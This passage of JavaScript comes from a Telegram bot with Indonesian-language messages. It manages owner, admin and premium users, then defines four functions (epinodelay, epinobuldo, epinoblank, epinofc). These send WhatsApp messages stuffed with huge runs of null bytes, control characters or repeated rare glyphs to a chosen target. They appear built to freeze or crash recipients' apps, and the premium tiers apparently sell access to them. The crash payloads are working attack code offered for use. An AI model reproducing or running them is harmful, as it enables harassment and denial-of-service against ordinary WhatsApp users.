      return bot.sendMessage(chatId, `
❌ Command salah, Masukan user id serta waktu expired, /addadmin 58273654 30d`);
      
      const userId = parseInt(match[1].replace(/[^0-9]/g, ''));
      if (!/^\d+$/.test(userId)) {
      return bot.sendMessage(chatId,`
❌ Command salah, Masukan user id serta waktu expired, /addadmin 58273654 30d`);
      }

      if (!adminUsers.includes(userId)) {
      adminUsers.push(userId);
      saveAdminUsers();
      console.log(`${senderId} Added ${userId} To Admin`);
      bot.sendMessage(chatId, `
✅Berhasil menambahkan admin, kini user ${userId} Memiliki aksess admin. `);
      } else {
      bot.sendMessage(chatId, `❌ User ${userId} is already an admin.`);
      }
      });

bot.onText(/\/delprem(?:\s(\d+))?/, (msg, match) => {
          const chatId = msg.chat.id;
          const senderId = msg.from.id;
          if (!isOwner(senderId) && !adminUsers.includes(senderId)) {
          return bot.sendMessage(chatId, `
❌ Akses ditolak, hanya owner yang dapat melakukan command ini.`);
          }
          if (!match[1]) {
          return bot.sendMessage(chatId,`
❌ Command salah! Contoh /delprem 584726249 30d.`);
          }
          const userId = parseInt(match[1]);
          if (isNaN(userId)) {
          return bot.sendMessage(chatId, "❌ Invalid input. User ID must be a number.");
          }
          const index = premiumUsers.findIndex(user => user.id === userId);
          if (index === -1) {
          return bot.sendMessage(chatId, `❌ User ${userId} tidak terdaftar di dalam list premium.`);
          }
                premiumUsers.splice(index, 1);
                savePremiumUsers();
         bot.sendMessage(chatId, `
✅ Berhasil menghapus user ${userId} dari daftar premium. `);
         });

bot.onText(/\/deladmin(?:\s(\d+))?/, (msg, match) => {
        const chatId = msg.chat.id;
        const senderId = msg.from.id;
        if (!isOwner(senderId)) {
        return bot.sendMessage(
        chatId,`
❌ Akses ditolak, hanya owner yang dapat melakukan command ini.`,

        { parse_mode: "Markdown" }
        );
        }
        if (!match || !match[1]) {
        return bot.sendMessage(chatId, `
❌Comand salah, Contoh /deladmin 5843967527 30d.`);
        }
        const userId = parseInt(match[1].replace(/[^0-9]/g, ''));
        if (!/^\d+$/.test(userId)) {
        return bot.sendMessage(chatId, `
❌Comand salah, Contoh /deladmin 5843967527 30d.`);
        }
        const adminIndex = adminUsers.indexOf(userId);
        if (adminIndex !== -1) {
        adminUsers.splice(adminIndex, 1);
        saveAdminUsers();
        console.log(`${senderId} Removed ${userId} From Admin`);
        bot.sendMessage(chatId, `
✅ Berhasil menghapus user ${userId} dari daftar admin.`);
        } else {
        bot.sendMessage(chatId, `❌ User ${userId} Belum memiliki aksess admin.`);
        }
        });

bot.onText(/\/cekidch (.+)/, async (msg, match) => {
    const chatId = msg.chat.id;
    const link = match[1];
    
    
    let result = await getWhatsAppChannelInfo(link);

    if (result.error) {
        bot.sendMessage(chatId, `⚠️ ${result.error}`);
    } else {
        let teks = `
📢 *Informasi Channel WhatsApp*
🔹 *ID:* ${result.id}
🔹 *Nama:* ${result.name}
🔹 *Total Pengikut:* ${result.subscribers}
🔹 *Status:* ${result.status}
🔹 *Verified:* ${result.verified}
        `;
        bot.sendMessage(chatId, teks);
    }
});
// ------------------ ( Function Disini ) ------------------------ \\
async function epinodelay(sock, target) {
  await sock.relayMessage(target, {
    groupStatusMessageV2: {
      message: {
        interactiveResponseMessage: {
          body: {
            text: "Epino Engine",
            format: "DEFAULT"
          },
          nativeFlowResponseMessage: {
            name: "call_permission_request",
            paramsJson: "\u0000".repeat(1045000),
            version: 3
          }, 
        }
      }
    }
  }, { participant: { jid: target }});

await sleep(500);

  await sock.relayMessage(target, {
    groupStatusMessageV2: {
      message: {
        interactiveResponseMessage: {
          body: {
            text: "Epino Engine",
            format: "DEFAULT"
          },
          nativeFlowResponseMessage: {
            name: "call_permission_request",
            paramsJson: "\u0000".repeat(1045000),
            version: 3
          }, 
        }
      }
    }
  }, { participant: { jid: target }});
}

async function epinobuldo(sock, target) {
  await sock.relayMessage(target, {
    groupStatusMessageV2: {
      message: {
        interactiveResponseMessage: {
          body: {
            text: "Epino Engine",
            format: "DEFAULT"
          },
          nativeFlowResponseMessage: {
            name: "call_permission_request",
            paramsJson: "\u0000".repeat(1045000),
            version: 3
          }, 
        }
      }
    }
  }, { participant: { jid: target }});

await sleep(500);

  await sock.relayMessage(target, {
    groupStatusMessageV2: {
      message: {
        interactiveResponseMessage: {
          body: {
            text: "Epino Engine",
            format: "DEFAULT"
          },
          nativeFlowResponseMessage: {
            name: "call_permission_request",
            paramsJson: "\u0000".repeat(1045000),
            version: 3
          }, 
        }
      }
    }
  }, { participant: { jid: target }});
}

async function epinoblank(sock, target) {
  await sock.relayMessage(
    target,
    {
      interactiveResponseMessage: {
        body: {
          text: "Epino Engine",
          format: 1
        },
        nativeFlowResponseMessage: {
          name: "galaxy_message",
          paramsJson: JSON.stringify({
            wa_flow_response_params: {
              title: "𑇂𑆵𑆴𑆿".repeat(60000)
            }
          }),
          version: 3
        }
      }
    }, { participant: { jid: target }});
  }

async function epinofc(sock, target) {
 await sock.relayMessage(target, {
     interactiveMessage: {
       body: {
         text: "Epino Engine"
            },
            nativeFlowMessage: {
              buttons: [
                {
                  name: "booking_status",
                 ParamsJson: "\u0003".repeat(90000),
               },
             ],
           },
         },
       }, { participant: { jid: target }});
     }  
// ------------------ ( End Function ) ------------------ \\